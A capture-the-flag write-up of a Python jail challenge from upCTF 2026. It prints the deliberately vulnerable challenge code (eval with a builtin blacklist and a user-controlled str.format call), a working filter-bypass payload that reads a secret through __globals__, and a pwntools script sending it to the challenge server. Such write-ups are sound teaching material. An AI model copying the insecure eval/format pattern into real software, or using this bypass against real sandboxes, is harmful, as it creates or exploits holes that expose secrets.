# pyjail — upCTF 2026

**Category:** MISC (Python Jail)
**Flag:** `upCTF{fmt_str1ng5_4r3nt_0nly_a_C_th1ng-aiHIty3M754f4052}`

## TL;DR

Python jail with `eval()` without builtins, builtin name blacklist by substring (case-insensitive), max 66 characters, and forbidden chars (`"`, `,`, `;`, `` ` ``). After the eval, `friend.format(self=self)` is executed — a format string attack. The walrus operator (`:=`) is used to assign `friend` and string concatenation (`'__glo'+'bals__'`) to evade the `globals` filter. The format string resolves `{self.__init__.__func__.__globals__[API_KEY]}` and prints the flag.

---

## Analysis

### Challenge Code

```python
import os
API_KEY = os.getenv("FLAG")

class cdm22b:
    def __init__(self):
        self.SAFE_GLOBALS = locals()     # captures 'self'
        self.SAFE_GLOBALS['__builtins__'] = {}
        self.name = "cdm"
        self.role = "global hacker, hacks planets"
        self.friend = "No one"

    def validateInput(self, input: str) -> tuple[bool, str]:
        if len(input) > 66:                            # 1. max 66 chars
            return False, 'to long, find a shorter way'
        for builtin in dir(__builtins__):               # 2. blacklist builtins
            if builtin.lower() in input.lower():
                return False, 'builtins would be too easy!'
        if any(i in input for i in '",;`'):             # 3. forbidden chars
            return False, 'bad bad bad chars!'
        return True, ''

    def safeEval(self, s):
        try:
            eval(s, self.SAFE_GLOBALS)                  # 4. eval without builtins
        except Exception:
            print("Something went wrong")

    def myFriend(self):
        friend = self.SAFE_GLOBALS.get('friend', self.friend)
        print(friend.format(self=self))                 # 5. FORMAT STRING!
```

### Constraints

| Constraint | Details |
|------------|---------|
| Length | ≤ 66 characters |
| Blacklist | All names in `dir(__builtins__)` — substring match, case-insensitive |
| Forbidden chars | `"` `,` `;` `` ` `` |
| Eval context | `__builtins__ = {}` — no built-in functions |

### Relevant Blocked Words

`globals`, `dict`, `getattr`, `setattr`, `hasattr`, `eval`, `exec`, `open`, `print`, `type`, `str`, `int`, `len`, `id`, `set`, `dir`, `vars`, `list`, `bool`, `chr`, `ord`, `hex`, `True`, `False`, `None`, ...

(159 names in total)

### Vulnerability: Format String Injection

After the eval, `myFriend()` executes:

```python
friend.format(self=self)
```

If we control the value of `friend`, we can use **Python format string syntax** to access arbitrary attributes of the `self` object:

```python
{self.__init__.__func__.__globals__[API_KEY]}
```

This resolves the attribute chain:
1. `self` → instance of `cdm22b`
2. `.__init__` → bound method
3. `.__func__` → underlying function (unbound)
4. `.__globals__` → module globals dictionary
5. `[API_KEY]` → key access into the dict → the flag

---

## Exploit

### Bypass 1: Walrus operator to assign within eval

`eval()` does not support assignments (`=`), but it does support the **walrus operator** (`:=`), which assigns and returns the value:

```python
(friend := 'value')
```

This assigns `friend` in the eval's scope, which is `SAFE_GLOBALS`. Afterwards, `myFriend()` reads it from there with `SAFE_GLOBALS.get('friend', ...)`.

### Bypass 2: String concatenation to evade `globals`

The substring `globals` is blocked. But we can split the string:

```python
'__glo' + 'bals__'
```

Neither fragment contains `globals` as a substring, and the concatenation produces `__globals__` at runtime.

### Final Payload

```python
(friend:='{self.__init__.__func__.__glo'+'bals__[API_KEY]}')
```

| Check | Result |
|-------|--------|
| Length | 60 chars ✓ (≤ 66) |
| `globals` substring | `'__glo'` + `'bals__'` — no match ✓ |
| Forbidden chars | Only uses `'`, `(`, `)`, `+`, `{`, `}`, `[`, `]` ✓ |
| Other builtins | No builtin name as substring ✓ |

### Execution Flow

```
1. Input: (friend:='{self.__init__.__func__.__glo'+'bals__[API_KEY]}')
2. validateInput: PASS
3. eval() executes walrus → SAFE_GLOBALS['friend'] = '{self.__init__.__func__.__globals__[API_KEY]}'
4. myFriend() → friend.format(self=self)
5. Python format engine resolves the attribute chain → prints the flag
```

### solve.py

```python
#!/usr/bin/env python3
from pwn import *

s = remote("46.225.117.62", 30010)
s.sendline(b"(friend:='{self.__init__.__func__.__glo'+'bals__[API_KEY]}')")
print(s.recvline(timeout=5).decode().strip())
s.close()
```

```bash
python3 solve.py
# upCTF{fmt_str1ng5_4r3nt_0nly_a_C_th1ng-aiHIty3M754f4052}
```

---

## Discarded Approaches

| # | Approach | Why It Didn't Work |
|---|----------|--------------------|
| 1 | Direct access via `__globals__` | Substring `globals` blocked by the filter |
| 2 | Using `__dict__` to traverse objects | Substring `dict` blocked |
| 3 | `__getattribute__` for dynamic access | Substring `getattr` blocked |
| 4 | Unicode tricks in attribute names | Python format strings do not support Unicode normalization in attribute access |

---

## Key Lessons

1. **Format strings in Python are dangerous**: `str.format()` allows traversing arbitrary chains of attributes and dictionary items — equivalent to an object ORM
2. **Walrus operator in eval()**: `:=` is the only way to perform "assignment" inside `eval()` (which only accepts expressions)
3. **String concatenation evades substring filters**: `'__glo'+'bals__'` produces `__globals__` at runtime but does not contain `globals` as a substring in the source
4. **The flag says it all**: `fmt_str1ng5_4r3nt_0nly_a_C_th1ng` — format strings are not just a C problem

## References

- [Python format string vulnerability](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/)
- [Python jail escape techniques](https://book.hacktricks.wiki/en/generic-hacking/python/bypass-python-sandboxes/index.html)
- [PEP 572 — Assignment Expressions (walrus operator)](https://peps.python.org/pep-0572/)
